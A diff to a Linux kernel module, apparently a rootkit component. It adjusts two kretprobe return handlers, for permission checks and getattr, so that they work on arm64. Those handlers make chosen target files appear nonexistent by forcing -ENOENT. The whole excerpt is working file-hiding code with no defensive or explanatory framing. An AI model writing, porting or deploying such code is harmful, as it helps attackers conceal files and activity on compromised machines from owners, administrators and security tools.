@@ -241,15 +241,16 @@ static int perm_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 	return 0;
 }
 
-static void perm_exit(struct kretprobe_instance *ri, struct pt_regs *regs)
+static int perm_exit(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
 	struct inode *inode;
 
 	if (!hide_dirents || !hook_perm || !target_count)
-		return;
+		return 0;
 	inode = *(struct inode **)ri->data;
 	if (is_target_inode(inode))
-		regs_return_value(regs) = -ENOENT;
+		regs->regs[0] = -ENOENT;
+	return 0;
 }
 
 static int getattr_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
@@ -260,16 +261,17 @@ static int getattr_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 	return 0;
 }
 
-static void getattr_exit(struct kretprobe_instance *ri, struct pt_regs *regs)
+static int getattr_exit(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
 	struct path *path;
 
 	if (!hide_dirents || !hook_getattr || !target_count)
-		return;
+		return 0;
 	path = *(struct path **)ri->data;
 	if (path && path->dentry && path->dentry->d_inode &&
 	    is_target_inode(path->dentry->d_inode))
-		regs_return_value(regs) = -ENOENT;
+		regs->regs[0] = -ENOENT;
+	return 0;
 }
 
 static int register_perm_getattr_hooks(void)
